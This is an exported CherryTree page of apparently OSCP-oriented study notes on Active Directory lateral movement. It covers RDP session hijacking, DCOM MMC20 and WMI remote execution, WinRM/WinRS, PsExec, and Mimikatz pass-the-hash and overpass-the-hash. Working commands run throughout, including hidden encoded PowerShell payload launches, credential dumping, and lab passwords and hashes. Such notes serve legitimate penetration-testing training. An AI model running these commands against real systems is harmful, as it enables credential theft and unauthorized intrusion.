<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AD Lateral Movement</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AD Lateral Movement</h1><br/><p><h1>Background</h1></p><p>[Win 112-129 / OSCP&#39;s PDF 778]</p><p></p><p>Even if you can&#39;t access other machines in the Net via traditional means (e.g RDP, RCE via Local Admin + impacket-psexec, etc), may be able to get RCE by leveraging access to a connected machine.</p><p></p><p><h2>Permissions</h2></p><p>If you&#39;re trying to get a shell as another Windows user, some methods require 1 of the following Group Policy Settings:</p><p></p><p><h3>Log on Locally</h3></p><p>Allows a user to sign in interactively at the console or via RDP. It&#39;s only needed for interactive logins (e.g., console logons, <strong>RDP</strong>, interactive <strong>SSH</strong> sessions).</p><p></p><p><strong>WinRM</strong> and <strong>PsExec</strong> do not require <strong>Log on Locally</strong> since they are remote execution tools that use different authentication methods.</p><p></p><p>If a user does not have this right &amp; you&#39;re using an interactive login method, you&#39;ll get an error like:</p><p></p><p><strong>The sign-in method you&#39;re trying to use isn&#39;t allowed</strong></p><p></p><p><h3>Log on as a Batch Job</h3></p><p>Allows a user account to run scripts or <span style="color:#ff0000;">scheduled tasks</span> (<span style="color:#ff0000;">non-interactively</span>), like via <strong>Task Scheduler</strong> or service accounts.</p><p></p><p>Without this right, tasks you create may fail silently or give:</p><p></p><p><strong>The user account does not have permission to run this task</strong></p><p></p><p><h1>RDP Active Sessions</h1></p><p>[Network 30-]</p><p></p><p>Leverage another user&#39;s active RDP session to pivot to their account. These methods are more useful in an AD setting to pivot between hosts, since you&#39;ll need high privs on the current host. There are atleast 3 methods.</p><p></p><p>For example, bob is using <strong>client02</strong> to RDP into <strong>evil01</strong>.</p><p></p><p>See <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#RDP Permissions">RDP Permissions</a>. Group membership may not be needed. A user may not have privs needed to RDP back into the client machine that they&#39;re using (e.g. <strong>client02</strong>).</p><p></p><p><h2>Dump NTLM from RDP Session</h2></p><p>If you have Admin access on <strong>evil01</strong>, you can use Mimikatz to dump bob&#39;s NTLM hash from RAM. This gives you multiple attack vectors:</p><p><ol><li>Crack the hash</li></ol></p><p><ol><li>PtH</li></ol></p><p><ol><li><a href="PrivEsc--Windows--Active_Directory_10.html#OPtH">OPtH</a> to get a TGT</li></ol></p><p></p><p><h3>Pass-the-Hash</h3></p><p>You can use <strong>xfreerdp</strong> to PtH for RDP access, or use PtH to <span style="color:#ff0000;">access another service</span> (e.g. WinRM access via <strong>evil-winrm</strong>, SMB via <strong>nxc</strong>, etc)</p><p></p><p>Depending on the service you&#39;re accessing, bob may need to be a <span style="color:#ff0000;">Local Admin on the target</span> machine for PtH to work. For ex, <span style="color:#ff0000;">Admin isn&#39;t needed to access SMB</span> via PtH.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If a target machine doesn&#39;t have RDP enabled, &amp; bob is an Admin on that machine, you can can <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#Enable RDP">enable RDP</a> for RCE.</p><p></p><p><h3>OverPass-the-Hash</h3></p><p>See <a href="PrivEsc--Windows--Active_Directory_10.html#OPtH">OPtH</a></p><p></p><p><span style="color:#ff0000;">Admin privs aren&#39;t needed</span> for OPtH. You just need a way to request a TGT (Locally or Remotely).</p><p></p><p>There are many ways to leverage a TGT (e.g. against <span style="color:#ff0000;">various services</span>). For example, you can use a TGT for RDP using <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#RDP w/o creds">Windows</a> or <a href="PrivEsc--Linux--SysAdmin_Stuff--Linux_in_AD_103.html#Using RDP">Linux</a> (Need to setup the Kerberos Config).</p><p></p><p><h2>RDP Session Hijacking</h2></p><p>Hijack a running RDP session. If the target user is actively using the RDP session, they&#39;ll be kicked out. However, it&#39;s very common for users to disconnect from RDP without killing the process.</p><p></p><p>Targetting an RDP session where the user is disconnected will be more stealthy &amp; won&#39;t cause disruptions.</p><p></p><p>A benefit of RDP Session Hijacking is that you can <strong>LotL</strong>. You only need PsExec (or some other way to get a shell as NT AUTHORITY\SYSTEM) &amp; Task Manager.</p><p></p><p>You&#39;d normally be prompted for authentication when you try to <strong>Connect</strong> to another user&#39;s RDP session. However, no credentials are needed if Task Manager is running as SYSTEM.</p><p></p><p>This means you can leverage a compromised Windows host to pivot to other machines (i.e. using Domain Accounts).</p><p></p><p><h3>Requirements</h3></p><p>You need GUI access to leverage Task Manager &amp; the ability to run it as SYSTEM.</p><p></p><p>This was stealth <span style="color:#ff0000;">patched in Windows Server 2019</span>, so the system needs to be outdated. However, this patch introduced the RDP Shadowing attack vector.</p><p></p><p><h3>Steps</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">SYSTEM Shell</span>: Using a Local Admin account, Right click CMD &amp; Run as Admin. Use PsExec to get SYSTEM &amp; then run <strong>whoami</strong> in that shell.</p><p></p><p><em>.\PsExec.exe -s -i cmd.exe</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Task Manager</span>: Using the SYSTEM Shell, launch Task Manager so it&#39;ll run in the context of the SYSTEM account.</p><p></p><p><em>taskmgr</em></p><p></p><p>In Task Manager, <strong>Users</strong> → Right Click the Target Account → <strong>Connect</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Task Manager will show <strong>status disconnected</strong> if the user isn&#39;t currently using their RDP session. This method will work regardless, if you don&#39;t care about causing distruptions.</p><p></p><p><h2>RDP Shadowing</h2></p><p></p><p><h1>DCOM</h1><h1></h1></p><p><h1></h1>[OSCP 121]</p><p>Uses <span style="color:#ff0000;">RPC port 135</span> for RCE. Various DCOM Lateral Movement Techniques (incl this one) are covered <a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">here</a>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: This shell seemed very responsive &amp; supported scrolling to previous commands using the arrow keys. The shell was more stable than other Lateral Movement methods covered.</p><p></p><p><h2>Prerequisites</h2></p><p>By default, the <span style="color:#ff0000;">currently authenticated user</span> must be in the Local <span style="color:#57e389;">Administrators</span> group on the both the <span style="color:#ff0000;">current machine</span>, <span style="color:#ff0000;">&amp; </span>the<span style="color:#ff0000;"> target machine</span> (I think).</p><p></p><p>Unlike other methods, you can&#39;t provide credentials to sign in as a different user on the target machine.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Could you get around this by using Mimikatz to PtH or PtT to impersonate another user, &amp; then perform these actions in the context of that impersonated account?</p><p></p><p><h2>Pivot via DCOM &amp; MMC</h2></p><p><h3>Setup</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">Launch Powershell as Admin</span>: Right Click...just like you do for Mimikatz</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Instantiate Remote MMC App</span></p><p><em>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.50.73&quot;))</em></p><p></p><p><h3>Test Payload</h3></p><p>I *think* that you&#39;re able to view the calculator process from your current host, even though you&#39;re launching it on the remote host (Offsec was unclear about this).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Launch Calcuator</span>: <em>$dcom.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Check Processes</span>: The output should show that it&#39;s run in Session 0, as shown in the example below.</p><p></p><p><em>tasklist | findstr &quot;calc&quot;</em></p><p></p><p><strong>win32calc.exe 			4764		 Services		 0 		12,132 K</strong></p><p></p><p><h3>RCE Payload</h3></p><p><em>$dcom.Document.ActiveView.ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;powershell -nop -w hidden -e ENCODED_PAYLOAD&quot;,&quot;7&quot;)</em></p><p><h1></h1></p><p><h1>WMI</h1></p><p>[Win 112-113]</p><p>Uses <span style="color:#ff0000;">RPC port 135</span> for RCE.</p><p></p><p>There are 2 methods for RCE: WMIC &amp; PS. WMIC became deprecated in 2023, but may still be enabled for backwards compatibility.</p><p></p><p><h2>Prerequisites</h2></p><p>By default, the user needs to be in the Local <span style="color:#57e389;">Administrators</span> group on the target machine (even if it&#39;s a Domain User account).</p><p></p><p><h2>Test Payloads</h2></p><p>Try spawning a Calculator. If you output has a PID and ReturnValue 0, you know it works &amp; you can replace this for a Reverse shell payload.</p><p></p><p><em>$Command = ‘calc&#39;;</em></p><p></p><p><h2>WMIC</h2></p><p><em>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;</em></p><p></p><p><h2>Powershell</h2></p><p><em>$username = &#39;jen&#39;;</em><em></em></p><p><em>$password = &#39;Nexus123!&#39;;</em><em></em></p><p><em>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;</em><em></em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</em><em></em></p><p><em></em><em></em></p><p><em>$Options = New-CimSessionOption -Protocol DCOM</em><em></em></p><p><em>$Session = New-Cimsession -ComputerName TARGET_IP -Credential $credential -SessionOption $Options</em><em></em></p><p><em></em><em></em></p><p><em>$Command = &#39;powershell -nop -w hidden -e ENCODED_PS&#39;;</em><em></em></p><p><em></em><em></em></p><p><em>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</em></p><p></p><p><h1>WinRM</h1></p><p>[Win 114]</p><p>Ports <strong>5985</strong> (HTTPS) &amp; <strong>5986</strong> (HTTP) by default.</p><p></p><p>Nmap may just show HTTP / HTTPS for a target that has ports open for WinRM.</p><p></p><p><h2>Prerequisites</h2></p><p>By default, the user needs to be in either the <span style="color:#57e389;">Administrators</span> or the <span style="color:#57e389;">Remote Management Users</span> group (but this can be changed).</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>★: <span style="color:#ff0000;">Even if you aren&#39;t in either group</span>, you still <span style="color:#ff0000;">may be able to connect</span> due to- A) Nested Group membership B) Non-default settings C) <a href="Pivoting--AD_Lateral_Movement_39.html#PS Remoting Spec Conf">Special Configuration</a> (I think?)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Just because you can&#39;t </span>sign in from the attacker&#39;s machine using <span style="color:#ff0000;">evil-winrm</span>, <span style="color:#ff0000;">doesn&#39;t mean you can use one of these</span> other methods to pivot with WinRM! <span style="color:#ff0000;">Access may be restricted to hosts in the subnet</span>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: What if you used a tunnel with evil-winrm (especially an HTTP tunnel)? Would that always work instead of these methods?</p><p></p><p><h2>PS Remoting (PSSession)</h2></p><p>Enabled by default on Windows Servers since 2012, but if the server has a “public” network profile, PS Remoting is only enabled for hosts in the same subnet by default.</p><p></p><p><h3>Basic Method (Offsec)</h3></p><p>First you create a PSSession object, &amp; then you interact with it.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Create PSSession Object</span></p><p>After running this, you <span style="color:#ff0000;">should get output telling you the ID, Availability, &amp; other info</span>.</p><p></p><p>(Should there be a <strong>;</strong> at the end of the last line? It wasn&#39;t there in the example given.)</p><p></p><p><em>$username = ‘jen’;</em><em></em></p><p><em>$password = ‘Nexus123!’;</em><em></em></p><p><em>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;</em><em></em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</em><em></em></p><p><em>New-PSSession -ComputerName 192.150.68.12 -Credential $credential</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Interact with PSSession Object</span></p><p>After running the above commands, connect using the provided ID number (e.g. <strong>1</strong>).</p><p></p><p><em>Enter-PSSession 1</em></p><p></p><p><a name="PS Remoting Spec Conf"></a><h3>Special Configuration</h3></p><p>[CTF2 98-99]</p><p>These are used to <span style="color:#ff0000;">modify the rights a specific user would normally have </span>(e.g. <span style="color:#ff0000;">Allowing them to connect</span> over WinRM or <span style="color:#ff0000;">granting them more access</span> to resources).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is there a way to check what Configuration Names a host uses before you have RCE? Do you just have to hope it&#39;s written on your current host somewhere (e.g. in PS History)?</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">List Session Configurations</span>: The 3rd method is useless for pivoting. If you&#39;re already an Admin, you probably won&#39;t benefit from using a Session Configuration. </p><p><ol><li>View <span style="color:#ff0000;">command History</span> for references to <strong>ConfigurationName</strong> argument or <strong>Get-PSSessionConfiguration</strong> cmdlet. Could <span style="color:#ff0000;">reveal Local or Remote Session Configurations</span>.</li></ol></p><p><ol><li><strong>{Local}</strong> There are 2 methods for listing Local Session Configurations outlined <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_session_configurations?view=powershell-7.4">here</a>, using <strong>Get-PSSessionConfiguration</strong> or WSMan.</li></ol></p><p><ol><li><strong>{Remote}</strong> This <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-pssessionconfiguration?view=powershell-7.4#example-7-get-detailed-session-configurations-from-a-remote-computer">method</a> must be done from an Admin PS terminal &amp; requires:<strong> A)</strong> Admin on Local Machine <strong>B) </strong>Admin on Remote Machine <strong>C)</strong> CredSSP delegation is enabled</li></ol></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Example</span>: [CTF2 98-99] Found in Powershell history on Linux Machine&#39;s <strong>pwsh</strong>. (No <strong>;</strong> following each line &amp; PSCredential syntax is different than normal. Are these mandatory or optional changes?)</p><p></p><p><em>$ClearPass = “Passw0rd”</em><em></em></p><p><em>$SecurePass = ConvertTo-SecureString $password -AsPlaintext -Force</em><em></em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential(&quot;safeuserHelpDesk&quot;, $SecurePass)</em><em></em></p><p><em></em><em></em></p><p><em>Enter-PSSession -ComputerName bandit.corp -Credential $credential </em><em><span style="color:#ff0000;">-ConfigurationName </span></em><em>testHelpDesksafe</em><em><span style="color:#ff0000;"> -Authentication Negotiate</span></em></p><p></p><p><h2>Windows Remote Shell (WinRS)</h2></p><p><h3>Test Payload</h3></p><p>Confirm that you&#39;re able to sign in as target user on the designated host.</p><p></p><p><em>winrs -r:files04 -u:jen -p:Nexus123! &quot;cmd /c hostname &amp; whoami&quot;</em></p><p></p><p><h3>Reverse Shell</h3></p><p><em>winrs -r:files04 -u:jen -p:Nexus123! &quot;powershell -nop -w hidden -e ENC_PowerShell&quot;</em></p><p></p><p><a name="psexec"></a><h1>PSExec (Sysinternals)</h1></p><p>[OSCP 34 &amp; Win 114-115, 130]</p><p></p><p>If no creds are specified &amp; you use target&#39;s hostname (not IP), it&#39;ll use Kerberos Auth. Use <span style="color:#ff0000;">-s for SYSTEM instead of -i</span> if you&#39;re Local Admin on target machine.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Uploading</span>: Does not need to be installed! You <span style="color:#ff0000;">can upload the binary</span> from <a href="file:///usr/share/windows-resources/psTools">/usr/share/windows-resources/psTools</a> or the <a href="https://download.sysinternals.com/files/PSTools.zip">link</a>. Using <span style="color:#ff0000;">x64 version</span> may be safer bet.</p><p></p><p>When using an <span style="color:#ff0000;">IP</span> instead of a hostname, if no creds are supplied, it will try to auth using the current NTLM hash in the RAM for this PS Session.</p><p></p><p>When using a <span style="color:#ff0000;">hostname</span> instead of an IP, if no creds are supplied, it&#39;ll try to auth with the user&#39;s Kerberos TGT that&#39;s stored in RAM for this PS Session. (Needed for OPtH)</p><p></p><p><h2>Prerequisites</h2></p><p>2-4 are true by default on modern servers</p><p><ol><li>The User that authenticates to the target must be in the Local <span style="color:#57e389;">Administrators</span> group on that machine</li></ol></p><p><ol><li>The <strong>ADMIN$</strong> Share must be available</li></ol></p><p><ol><li><strong>File and Printer Sharing</strong> must be turned on</li></ol></p><p><ol><li>SMB Traffic must be allowed to go through target&#39;s firewall</li></ol></p><p></p><p><h2>Use Cases</h2><h2></h2></p><p><h2></h2>Can try without the<strong> -accepteula</strong> argument if needed, but it should just prevent a pop-up from appearing, which generally helps.</p><p></p><p><h3>Specify a Password</h3></p><p><em>./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd</em></p><p></p><p><h3>Executing as Current User</h3></p><p>If current user is an Admin on the target machine</p><p></p><p><em>.\PsExec.exe -accepteula -i \\MS02 powershell</em></p><p></p><p><a name="psexec OPtH"></a><h3>Using with NTLM Hash (OPtH)</h3></p><p>[Win 118-119]</p><p>Use <span style="color:#ff0000;">Mimikatz to PtH &amp; launch PS session as that user</span>. Then you send a TGT-REQ as that user to get the TGT you&#39;ll use with PSExec.</p><p></p><p>Mimikatz PtH requires an Admin PS Session &amp; Rubeus (asktgt) does also because you need to inject a TGT into RAM.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Setup</span>: Launch an Admin Powershell terminal &amp; run Mimikatz. Then you elevate &amp; dump NTLM hashes.</p><p></p><p><strong>privilege::debug</strong></p><p><strong>sekurlsa::logonpasswords</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">PtH</span>: PtH to impersonate the user &amp; spawn a powershell session as that account.</p><p></p><p><strong>sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">OPtH</span>: Check for tickets in RAM (sanity check) &amp; then Request a TGT as impersonated user (converting their NTLM hash into a TGT). One way to do this is to auth to a host&#39;s SMB share. Re-check for ticked in RAM to see if impersonated user has a TGT.</p><p></p><p><em>klist</em><em></em></p><p><em>net use \\files04</em><em></em></p><p><em>klist</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">RCE</span>: Now that you have a TGT, you can use it with PSExec if you don&#39;t pass any credentials.</p><p></p><p><em>.\PsExec.exe \\files04 cmd</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The offsec example didn&#39;t use <strong>-i</strong>. Is that a typo? Should it be omitted?</p><p></p><p><h2>Troubleshooting</h2></p><p><h3>Freezing</h3></p><p>[Win 117]</p><p><span style="color:#060f94;text-decoration:underline;">Warning</span>: <span style="color:#ff0000;">Sometimes seems to freeze</span> &amp; makes your shell useless (maybe it launches a new prompt out of sight of your Reverse Shell).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Solutions</span><ol><li> Use <strong><span style="color:#ff0000;">-s</span></strong><span style="color:#ff0000;"> instead of </span><strong><span style="color:#ff0000;">-i</span></strong> (Runs as SYSTEM instead of current user. Worked for some reason)</li><li><span style="color:#ff0000;">Don&#39;t use either </span><strong><span style="color:#ff0000;">-s</span></strong><span style="color:#ff0000;"> or </span><strong><span style="color:#ff0000;">-i</span></strong>. (This isn&#39;t *supposed* to create an interactive shell, but it has before? If it&#39;s not interactive, use RCE to upload &amp; launch Reverse Shell payload?)</li></ol></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Kill the Process</span>: If high enough privs, can use another session to kill the proc- 	<em>taskkill /F /IM PsExec.exe</em></p></div>
</body>
</html>
